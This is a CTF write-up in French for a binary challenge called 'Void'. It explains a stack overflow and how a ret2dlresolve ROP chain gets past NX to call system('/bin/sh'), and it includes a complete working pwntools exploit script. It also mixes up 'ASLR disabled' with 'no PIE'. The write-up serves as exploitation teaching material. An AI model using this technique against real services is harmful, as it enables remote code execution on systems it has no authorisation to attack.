# Void - Nerumir

> On peut atteindre un service distant auquel on peut simplement envoyer une suite de caractères. Dans les fichiers fournis on nous donne le binaire correspondant au service. 

- J'ai utilisé Ghidra pour observer qu'on a affaire à une faille de type `stack overflow`, avec un dépassement possible après un offset de `72` sur un total de `200`. En théorie, suffisant pour créer un `shellcode` avec du `nop-sliding`. Malheureusement, la protection `NX` est présente, ce qui rend la `stack` non executable, le `shellcode` ne pourrait alors jamais être executé.

> [!TIP]
> La stratégie serait alors d'observer le binaire pour des fonctions executables qui permettraient de `leak` des données intéressantes comme le flag ou un accès `shell`. Malheureusement, rien de tel dans le programme. 

Le but sera alors d'atteindre un `syscall` ou bien une fonction d'une librairie partagée comme `system` de la `libc`, qui permettrait d'executer du code, donc `RCE`. 

> [!WARNING]
> Le problème étant que bien que l'`ASLR` soit désactivé (`NO PIE`), nous devons exploiter un service distant, donc il faudrait faire `leak` par exemple l'adresse de `read` via le gadget `pop rdi; ret` afin de déterminer l'`offset` de la `libc` sur le service distant et executer `system` avec une `ropchain`. Peut être qu'il n'y a pas assez de gadgets pour composer cet appel, je n'ai pas essayé. Nous allons plutôt profiter de l'absence de l'attribut `FULL RELRO`, cependant, cette seconde méthode va également nécessiter de connaître l'adresse d'une fonction (`dl_resolve`), cependant, pas besoin de `leak`, le service distant se comporte comme en local. On aurait alors pu connaître directement l'adresse de la fonction `system` tout aussi aisément sans avoir besoin de `leak`, j'ai juste fait cette petite parenthèse car des fois c'est nécessaire. Ça ne retire rien en revanche à la nécessité de trouver suffisamment de gadgets pour  composer l'appel, ce qui n'est pas nécessaire avec un `ret2dlresolve`, qui est alors plus `straightforward`.

On remarque que le flag `checksec` `Partial RELRO` est présent. On peut alors exploiter directement une `ret2dlresolve`, c'est à dire profiter du fait que la résolution de lien dynamique des symboles de librairies externes soient effectués au premier appel du symbole concerné. On va alors générer la structure nécessaire à cet appel dans la `stack` et la lier en `ROPchain` avec l'adresse de la fonction `dl_resolve` afin de l'appeler. Cette structure construite dans la `stack` va appeler la fonction `system` de la `libc` avec l'argument `/bin/sh` afin d'avoir un `reverse shell` à l'execution.

Voici le code `pwntool` utilisé : 

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('void', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 72)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive() #Garder le programme interactif
```

Avec l'`ASLR`, ça n'aurait pas été possible car la `dlresolve.data_addr` n'aurait pas été connue.
